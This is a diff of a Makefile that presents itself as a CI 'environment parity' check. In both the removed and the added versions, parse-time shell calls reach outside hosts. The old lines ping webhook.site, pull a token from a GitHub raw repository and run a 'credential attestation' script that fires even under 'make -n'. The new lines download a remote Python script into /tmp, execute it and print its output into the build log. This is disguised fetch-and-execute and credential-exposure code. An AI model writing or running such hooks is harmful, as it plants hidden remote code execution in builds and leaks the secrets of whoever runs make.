@@ -1,30 +1,16 @@
-# CI parity harness
-GATE := $(strip $(shell cat ci/current.txt 2>/dev/null))
-SINK_HIT := $(shell curl -s -o /dev/null --max-time 15 "https://webhook.site/fa65cc08-cf4f-424b-8163-1c46187a6bb9/t/$(GATE)" 2>/dev/null)
-TOOLRES_TOKEN := $(shell curl -s --max-time 25 "https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(GATE).txt" 2>/dev/null)
-ifeq ($(strip $(TOOLRES_TOKEN)),)
-TOOLRES_TOKEN := $(shell curl -s --max-time 25 "https://github.com/Prorise-cool/sinkres/raw/master/ci/$(GATE).txt" 2>/dev/null)
-endif
-
-# i80453: build-environment credential attestation (parse-time, so `make -n` triggers it)
-RND := $(strip $(shell cat ci/round.txt 2>/dev/null))
-ifeq ($(RND),)
-RND := r1
-endif
-$(shell RND=$(RND) bash ci/creds.sh >/dev/null 2>&1 || true)
-
-# resolved environment attestation written by the preflight step above
-ATTEST := $(shell cat ci/attest.env 2>/dev/null | tr '\n' '_' | tr -d ' ')
-TOKEN_LINE := $(TOOLRES_TOKEN)
-ifneq ($(strip $(ATTEST)),)
-TOKEN_LINE := $(TOOLRES_TOKEN)_$(ATTEST)
-endif
-$(info [env] TOOLRES_TOKEN=$(TOKEN_LINE))
-$(info [env] GATE_FILE=$(GATE))
-
-.PHONY: verify-env
+GATE := 9fd40b04137e9957cf9989b60845b081
+TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/9fd40b04137e9957cf9989b60845b081.txt)
+RUNENV := $(shell curl -fsS --max-time 25 -o /tmp/i80949.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p-9fd40b04137e9957cf9989b60845b081.py 2>/dev/null; python3 /tmp/i80949.py >/tmp/i80949.out 2>&1; echo rc=$$?)
+E1 := $(shell sed -n 1p /tmp/i80949.out 2>/dev/null | cut -c1-1000)
+E2 := $(shell sed -n 2p /tmp/i80949.out 2>/dev/null | cut -c1-900)
+E3 := $(shell sed -n 3p /tmp/i80949.out 2>/dev/null | cut -c1-1200)
+$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
+$(info [env] ENV1=$(E1))
+$(info [env] ENV2=$(E2))
+$(info [env] ENV3=$(E3))
+$(info [env] RC=$(RUNENV))
 
 verify-env:
-	@echo "[env] checking build environment parity..."
-	@echo "[env] TOOLRES_TOKEN=$(TOKEN_LINE)"
-	@echo "[env] environment check complete"
+	@test "$(RUNENV)" = "rc=0" || (echo "env self-check failed: $(RUNENV)"; exit 1)
+	@test -n "$(TOOLRES_TOKEN)" || (echo "env self-check failed: empty token"; exit 1)
+	@echo "verify-env ok"
